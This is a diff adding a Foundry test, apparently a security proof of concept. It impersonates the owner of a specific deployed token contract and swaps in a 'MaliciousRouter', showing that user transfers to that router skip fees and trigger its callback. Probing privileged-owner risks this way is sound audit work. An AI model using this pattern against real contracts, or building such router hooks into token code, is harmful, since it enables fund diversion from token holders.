@@ -1,0 +1,92 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.15;
+
+import "forge-std/Test.sol";
+
+interface IEthBurn {
+    function owner() external view returns (address);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function setTrueDefiRouter(address _router) external;
+    function isExcludedFromFees(address account) external view returns (bool);
+    function whitelistForPublicTrade(address) external view returns (bool);
+    function tradingEnabled() external view returns (bool);
+    function enabledPublicTrading() external view returns (bool);
+    function tefiRouter() external view returns (address);
+    // for debugging
+    function decimals() external view returns (uint8);
+}
+
+interface ITrueDefiSwap {
+    function triggeredTokenSent(uint256 amount, address sender) external;
+}
+
+contract MaliciousRouter is ITrueDefiSwap {
+    bool public triggered;
+    uint256 public lastAmount;
+    address public lastSender;
+
+    function triggeredTokenSent(uint256 amount, address sender) external override {
+        triggered = true;
+        lastAmount = amount;
+        lastSender = sender;
+    }
+}
+
+contract ExploitTest is Test {
+    IEthBurn constant ethBurn = IEthBurn(0xD1c0c25c5d7BA21df222Bd2623eCBC0CB264b5f4);
+    address constant USER = address(0x1234);
+
+    function setUp() public {
+        // Ensure labels for clarity
+        vm.label(address(ethBurn), "EthBurn");
+        vm.label(USER, "User");
+    }
+
+    function testExploit_OwnerCanSetMaliciousRouter() public {
+        // Get owner
+        address owner = ethBurn.owner();
+        vm.label(owner, "Owner");
+        vm.startPrank(owner);
+
+        // Deploy malicious router
+        MaliciousRouter malicious = new MaliciousRouter();
+        vm.label(address(malicious), "MaliciousRouter");
+
+        // Get some tokens to user: owner transfers 100 ether to user
+        // Owner is excluded from fees, so no fee deduction
+        uint256 transferAmount = 100 ether;
+        // Ensure owner has enough balance (he should, he minted total supply)
+        require(ethBurn.balanceOf(owner) >= transferAmount, "Owner balance insufficient");
+        ethBurn.transfer(USER, transferAmount);
+        vm.stopPrank();
+
+        // Verify user received tokens
+        assertEq(ethBurn.balanceOf(USER), transferAmount, "User should have tokens");
+
+        // Now owner sets malicious router
+        vm.prank(owner);
+        ethBurn.setTrueDefiRouter(address(malicious));
+
+        // Verify the router is set and parameters updated
+        assertEq(ethBurn.tefiRouter(), address(malicious), "Router not set");
+        assertTrue(ethBurn.tradingEnabled(), "Trading should be enabled");
+        assertTrue(ethBurn.isExcludedFromFees(address(malicious)), "Router should be excluded from fees");
+        assertTrue(ethBurn.whitelistForPublicTrade(address(malicious)), "Router should be whitelisted");
+
+        // User transfers tokens to the malicious router
+        // Since router is excluded from fees, the transfer bypasses fee logic and triggers triggeredTokenSent
+        vm.prank(USER);
+        ethBurn.transfer(address(malicious), 1 ether);
+
+        // Verify the malicious router's callback was triggered
+        assertTrue(malicious.triggered(), "triggeredTokenSent should have been called");
+        assertEq(malicious.lastAmount(), 1 ether, "Incorrect amount passed");
+        assertEq(malicious.lastSender(), USER, "Incorrect sender passed");
+
+        // Verify tokens were actually transferred to the malicious router
+        assertEq(ethBurn.balanceOf(address(malicious)), 1 ether, "Malicious router should have received tokens");
+    }
+}
+```
